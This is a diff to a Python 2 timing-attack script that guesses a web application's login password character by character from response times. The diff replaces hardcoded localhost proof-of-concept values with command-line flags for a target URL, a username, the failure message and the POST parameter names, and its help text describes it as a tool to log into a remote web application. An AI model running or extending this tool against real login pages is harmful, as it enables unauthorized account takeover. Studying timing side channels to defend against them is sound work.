@@ -11,27 +11,7 @@ import time
 import requests
 import string
 import sys
-
-# for when running in proof of concept mode
-# this will keep track of the number of failed times the program executes before
-# it is able to get the correct password through a timing attack
-KNOWNPASSWORD = 'abc'
-FAILEDPOCS = 0
-
-USERNAME = 'test'
-URL = 'http://localhost:3000/login'
-#CHARSET = string.ascii_lowercase
-CHARSET = 'abcde'
-
-# Message that comes in the response when the login fails
-FAILLOGINMESSAGE = 'Invalid username/password combination'
-
-# set to be the number of requests to set to the server for every character
-NUMREQUESTS = 10
-
-# POST parameter variable names
-USERNAMEPOSTPARAM = 'username'
-PASSWORDPOSTPARAM = 'password'
+import argparse
 
 def makerequest(guess):
     '''
@@ -87,11 +67,13 @@ def makerequest(guess):
         if n == len(chartimeavg.keys())-1:
             newguess = guess + key
             print "Guessing password begins with: '" + newguess + "'"
-            if newguess != KNOWNPASSWORD[:len(newguess)]:
-                print "'" + newguess + "' != '" + KNOWNPASSWORD[:len(newguess)] + "'"
-                FAILEDPOCS += 1
-                print "Number of failed timing attack attempts: " + str(FAILEDPOCS) + "\n"
-                main()
+            # if performing a PoC test
+            if KNOWNPASSWORD is not False:
+                if newguess != KNOWNPASSWORD[:len(newguess)]:
+                    print "'" + newguess + "' != '" + KNOWNPASSWORD[:len(newguess)] + "'"
+                    FAILEDPOCS += 1
+                    print "Number of failed timing attack attempts: " + str(FAILEDPOCS) + "\n"
+                    main()
             return newguess
         n += 1
 
@@ -128,4 +110,40 @@ def main():
         temppass = makerequest(temppass)
 
 if __name__ == '__main__':
+
+    parser = argparse.ArgumentParser(description='Perform a timing attack to log into a remote web application')
+    parser.add_argument('--url', help='The URL to target (ex. http://example.com/login/', dest="url",  required="True")
+    parser.add_argument('-n', help="The number of requests to send per character", dest="numreqs", required="True")
+    parser.add_argument('-F', help="The message displayed on the HTTP response indicating a failed login. Example: 'Invalid username/password combination'", dest="failedlogin", required="True")
+    parser.add_argument('-u', help="The username to attempt to log in to", dest="username", required="True")
+    parser.add_argument('-c', help='The character set to use for guessing', dest="charset", default="abcde")
+    parser.add_argument('-U', help="username POST parameter variable name", dest="postusername", default="username")
+    parser.add_argument('-P', help="password POST parameter variable name", dest="postpassword", default="password")
+    parser.add_argument('--poc-password', help="The known password. This is to run the application in proof-of-concept mode to count the number of failed attempts before a succesful timing attack is performed", dest="poc", default=False)
+    
+    args = parser.parse_args()
+
+    # for when running in proof of concept mode
+    # this will keep track of the number of failed times the program executes before
+    # it is able to get the correct password through a timing attack
+    KNOWNPASSWORD = args.poc
+    FAILEDPOCS = 0
+    
+    USERNAME = args.username
+    URL = args.url
+    #CHARSET = string.ascii_lowercase
+    CHARSET = args.charset
+    
+    # Message that comes in the response when the login fails
+    FAILLOGINMESSAGE = args.failedlogin
+    
+    # set to be the number of requests to set to the server for every character
+    NUMREQUESTS = int(args.numreqs)
+    
+    # POST parameter variable names
+    USERNAMEPOSTPARAM = args.postusername
+    PASSWORDPOSTPARAM = args.postpassword
+
+    print "KNOWNPASSWORD type is " + str(type(KNOWNPASSWORD))
+
     main()
